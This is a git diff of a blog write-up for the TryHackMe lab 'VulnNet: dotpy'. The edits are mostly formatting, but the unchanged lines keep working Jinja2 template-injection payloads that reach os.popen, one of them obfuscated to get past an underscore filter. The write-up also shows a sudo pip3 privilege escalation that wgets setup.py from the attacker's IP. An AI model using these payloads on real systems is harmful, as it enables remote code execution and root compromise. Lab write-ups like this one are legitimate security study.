@@ -1,14 +1,14 @@
 ---
 layout: writeup
 category: THM
-chall_description: VulnNet Entertainment is back with their brand new website... and stronger?
+chall_description: https://tryhackme-images.s3.amazonaws.com/room-icons/d0b3851085d530abbff79210cea04b5d.png
 tags: tryhackme web python privilegeescalation jinja2 pythonpathhijacking
 date: 2021-04-11
 comments: true
 ---
 
-Title: VulnNet: dotpy
-Description: <p>VulnNet Entertainment is back with their brand new website... and stronger?</p>
+Title: VulnNet: dotpy<br>
+Description: <p>VulnNet Entertainment is back with their brand new website... and stronger?</p><br>
 This room is availiable at [TryHackMe VulnNet:Dotpy](https://tryhackme.com/room/vulnnetdotpy) Go to [TryHackMe](https://tryhackme.com/)
 
 ## Ports
@@ -39,13 +39,13 @@ The following snippet will read the get parameter `c`
 
 now that we can read c. 
 lets try running code on the machine.
-```python
+```text
 {{request|attr('application')|attr( request|attr('args')|attr('get')('us')*2 + "globals" + request|attr('args')|attr('get')('us')*2 ) |attr( request|attr('args')|attr('get')('us')*2 + 'getitem' + request|attr('args')|attr('get')('us')*2 )( request|attr('args')|attr('get')('us')*2 + 'builtins' + request|attr('args')|attr('get')('us')*2) |attr( request|attr('args')|attr('get')('us')*2 + 'getitem' + request|attr('args')|attr('get')('us')*2)(request|attr('args')|attr('get')('us')*2 + 'import' + request|attr('args')|attr('get')('us')*2)('os')|attr('popen')(request|attr('args')|attr('get')('c'))|attr('read')()}}?us=_&c=
 ```
 
 All of this is to get the `_` from the get parameter `us` and use it in the code, bcause underscores are blocked. 
 this is the code when you dont have the underscore blocker
-```python
+```text
 {{request|attr('application')|attr( "__globals__" ) |attr( "__getitem__" )( "__builtins__") |attr( "__getitem__")("__import__")('os')|attr('popen')(request|attr('args')|attr('get')('c'))|attr('read')()}}?c=
 ```
 Way easier to read. :D
@@ -69,7 +69,7 @@ sudo -l
 #    (system-adm) NOPASSWD: /usr/bin/pip3 install *
 ```
 
-Lets check [GTFOBins](https://gtfobins.github.io/) for an exploit, and there is. [PIP Sudo | GTFOBins](https://gtfobins.github.io/gtfobins/pip/#sudo)
+Lets check [GTFOBins](https://gtfobins.github.io/) for an exploit, and there is [PIP Sudo GTFOBins](https://gtfobins.github.io/gtfobins/pip/#sudo).
 
 ```bash
 wget $YOUR_IP:8080/pip_setup.py; mv pip_setup.py setup.py
@@ -121,7 +121,6 @@ and we have a new shell. lets check our user!
 #uid=0(root) gid=0(root) groups=0(root)</code></pre>
 
 lets cat the root flag!
-
 <pre class="command-line" data-prompt="root@vulnnet-dotpy $" data-output="4">
 <code class="language-bash">cat ~/root.txt
 # THM{********************************}</code></pre>
